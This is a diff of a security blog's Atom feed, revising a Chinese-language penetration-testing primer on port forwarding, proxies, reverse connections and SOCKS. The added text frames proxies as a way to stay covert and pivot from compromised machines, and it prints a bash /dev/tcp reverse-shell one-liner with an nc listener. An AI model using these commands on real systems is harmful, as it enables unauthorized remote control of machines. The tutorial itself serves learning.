@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zzggtt.github.io</id>
     <title>ZG0T01</title>
-    <updated>2020-11-05T14:37:45.330Z</updated>
+    <updated>2020-11-08T14:21:48.189Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zzggtt.github.io"/>
     <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
@@ -16,45 +16,71 @@
         <link href="https://zzggtt.github.io/post/duan-kou-zhuan-fa-yu-bian-jie-dai-li/">
         </link>
         <updated>2020-11-05T14:35:18.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="为什么要用端口转发和代理"><strong>为什么要用端口转发和代理？</strong></h3>
+        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
+<p>大佬们总结的非常详细，做一个精神的搬运工，简单写写。</p>
+<h3 id="1-为什么用代理"><strong>1、为什么用代理？</strong></h3>
 <ul>
 <li>
-<p>更加安全</p>
-<p>直接远程登录会留下比较明显的痕迹，而且有时候权限也不够。</p>
+<p><strong>更隐蔽</strong></p>
+<p>直接通过登陆服务器的方式往往会留下比较明显的痕迹，且动作太大容易被发现。而且很多时候权限也不够。</p>
 </li>
 <li>
-<p>更好的接触目标</p>
-<p>内网渗透的过程中，需要工具和环境的辅助，如果目标机器上缺少对应的环境变量或者组件，会导致渗透受阻。</p>
+<p><strong>更好的接触到目标所处环境</strong></p>
+<p>渗透的过程中需要工具进行很辅助，如果目标机器缺少对应的环境变量或者组件，会导致渗透受阻。</p>
 </li>
 <li>
-<p>使用已有shell的机器，作为跳板，扩大战果</p>
+<p><strong>使用已有shell的机器，作为<code>跳板</code>，扩大战果</strong></p>
 </li>
 </ul>
-<h3 id="正向和反向连接"><strong>正向和反向连接</strong></h3>
-<p>首先要理解两种不同的连接方式：</p>
+<h3 id="2-正向和反向连接"><strong>2、正向和反向连接</strong></h3>
 <ul>
-<li>Client-&gt;Transit server-&gt;Server：Client能够正向连接Transit server。Transit server直接转发即可（<strong>Tansit Server对外开放</strong>）</li>
+<li>
+<p><strong>正向连接：</strong></p>
+<p>Client-&gt;Transit server-&gt;Server：Client能够正向连接Transit server。Transit server直接转发即可：</p>
+</li>
 </ul>
-<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1604587044214.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1604845258240.png" alt="" loading="lazy"></figure>
+<p>例如通过远程桌面连接服务器，SSH、TELNET等都是正向连接。</p>
 <ul>
-<li>Client&lt;-Transit server-&gt;Server：Client无法正向连接Transit server，但Transit server能够反向连接Client。（<strong>Tansit Server不对外开放，但是可以对外访问</strong>）</li>
+<li>
+<p><strong>反向连接：</strong></p>
+<p>Client&lt;-Transit server-&gt;Server：Client无法正向连接Transit server，但Transit server能够反向连接Client：</p>
+</li>
 </ul>
-<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1604587048694.png" alt="" loading="lazy"></figure>
-<p>例如常见的Windows远程登陆、SSH、Telnet、Web服务（连接webshell）等等都是<strong>正向连接</strong>。而我们打点拿下的机器在局域网内、ip动态改变、有防火墙等限制下则需要<strong>反向连接</strong>，例如反弹shell就是典型的反向连接。</p>
-<h3 id="端口转发和代理"><strong>端口转发和代理</strong></h3>
-<p>在渗透测试中，经常会使用到端口转发和代理。</p>
-<p>端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为。通过拿下shell的机器作为Tansit Server把攻击机的流量转发给内网其他机器。</p>
-<p>如果攻击机需要对内网多个端口进行扫描（或是多台机器的多个端口），逐个配置转发规则不现实，为了提高效率，可以使用代理，配置一次规则即可。</p>
-<p>转发工具：</p>
-<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1604587054023.png" alt="" loading="lazy"></figure>
-<p>推荐大佬们总结好的链接：</p>
+<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1604845263837.png" alt="" loading="lazy"></figure>
+<p>Client无法连接到Transit server，但Transit server能够反向连接到Client。</p>
+<p>例如反弹shell就是典型的反向连接。</p>
+<h3 id="3-端口转发和代理"><strong>3、端口转发和代理</strong></h3>
+<p>参考连接：</p>
 <p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86/">渗透基础-端口转发与代理</a></p>
 <p><a href="https://mp.weixin.qq.com/s/6Q_i34ND-Epcu-71LHZRlA">内网渗透之代理转发</a></p>
-<p><a href="https://payloads.online/archivers/2018-02-02/1">内网渗透常见的端口转发方式</a></p>
-<h3 id="反弹shell"><strong>反弹shell</strong></h3>
-<p>推荐看先知大佬总结的：</p>
-<p><a href="https://xz.aliyun.com/t/2549">Linux反弹shell的本质</a></p>
-<p>[Linux反弹shell基础](</p>
+<p><a href="https://payloads.online/archivers/2018-02-02/1#0x09-metasploit-socks4a">内网渗透常见的端口转发的方式</a></p>
+<h3 id="4-反弹shell"><strong>4、反弹shell</strong></h3>
+<p>reverse shell，指被控制端产生一个交互式shell，并重定向shell的输入输出，为控制端的某端口。</p>
+<p>为什么要反弹shell？</p>
+<p>当我们获得一个webshell后，通常用于被控端因防火墙受限、权限不足、端口被占用等情形，无法通过远程桌面或SSH的形式直接登陆目标服务器时，反弹shell就很重要了。</p>
+<p>以Linux下反弹shell为例：</p>
+<p><strong>被控制端：</strong></p>
+<pre><code class="language-bash">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1
+</code></pre>
+<p>通过bash产生一个交互式shell，并指定其输入输出为192.168.146.129的2333端口。</p>
+<p>在控制方监听端口的情况下对这个文件（/dev/tcp|udp/ip/port）进行读写，就能实现与监听端口的服务器的<code>socket通信</code></p>
+<p><strong>控制端：</strong></p>
+<pre><code class="language-bash">nc -lvp 2333
+</code></pre>
+<p>通过nc监听2333端口</p>
+<p>参考链接：</p>
+<p><a href="https://xz.aliyun.com/t/2549#toc-9">Linux反弹shell的本质</a></p>
+<h3 id="5-代理的本质-socks协议">5、代理的本质-Socks协议</h3>
+<p>SOCKS协议位于传输层(TCP/UDP等)与应用层之间，是最基本的<code>代理协议</code>，它是一种可以穿越防火墙的协议，例如想要上Google就得....</p>
+<p>目前有两个版本：SOCKS4和SOCKS5：</p>
+<p>SOCKS4支持TELNET、FTPHTTP等TCP协议；</p>
+<p>SOCKS5支持TCP与UDP，并支持安全认证方案。</p>
+<p>Ps: Socks不支持ICMP，不能使用ping命令。。记住哦~~~</p>
+<p>所以SOCKS能代理TCP和UDP的网络流量，对于它之下的网络流量，就无能为力了。</p>
+<p>SOCKS是怎么工作的呢，这里举个例子：</p>
+<p>A想访问B站点，但是A和B站点之间有一个防火墙阻止A直接访问B站点，在A的网络里面有一个SOCKS代理C，C可以直接访问B站点，所以A通知C他想访问B站点，C就为A和B之间架起一条沟通的通道。</p>
+<p>更详细的内容可参考：<a href="https://geesun.github.io/posts/2015/09/socks5_protocol.html">SOCKS 5协议简析</a></p>
 ]]></content>
     </entry>
     <entry>
